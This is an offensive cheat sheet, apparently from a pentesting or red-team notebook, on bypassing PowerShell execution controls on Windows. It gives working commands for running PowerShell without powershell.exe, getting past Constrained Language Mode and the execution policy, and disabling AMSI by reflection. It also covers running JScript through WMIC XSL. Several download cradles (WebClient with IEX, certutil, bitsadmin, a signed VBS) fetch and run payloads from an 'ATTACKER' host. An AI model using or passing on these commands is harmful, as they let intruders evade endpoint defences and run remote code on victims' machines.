# PowerShell Execution Bypass

## PowerShell Without powershell.exe
- Core engine is `System.Management.Automation.dll`, not powershell.exe
- **PowerShdll**: `rundll32.exe PowerShdll.dll,main` — full PS console via rundll32
- **SyncAppvPublishingServer** (Win10):
  `SyncAppvPublishingServer.vbs "Break; iwr http://ATTACKER:443"`
  — executes PS code from a Microsoft-signed VBS script

## Constrained Language Mode (CLM) Bypass
- Check mode: `$ExecutionContext.SessionState.LanguageMode`
- Bypass via: custom runspace in C#, or PowerShdll, or InstallUtil
- If AppLocker enforced, find writable paths in allowed rules

## Execution Policy Bypass
```powershell
powershell -ep bypass -file script.ps1
powershell -nop -exec bypass -c "IEX(cmd)"
Set-ExecutionPolicy Bypass -Scope Process
```

## AMSI Bypass
```powershell
# Patch amsi.dll in memory (example, signatures rotate)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## WMIC + XSL for Code Execution
```cmd
# evil.xsl contains JScript payload
wmic os get /FORMAT:"evil.xsl"
```
- Bypasses PowerShell logging entirely since code runs via JScript

## Download Cradles (Alternatives to IEX/DownloadString)
```powershell
# .NET WebClient
(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1') | IEX
# COM objects
$ie = New-Object -ComObject InternetExplorer.Application; $ie.navigate('http://ATTACKER/payload.ps1')
# certutil
certutil -urlcache -f http://ATTACKER/payload.exe c:\temp\payload.exe
# bitsadmin
bitsadmin /transfer j /download /priority high http://ATTACKER/payload.exe c:\temp\payload.exe
```
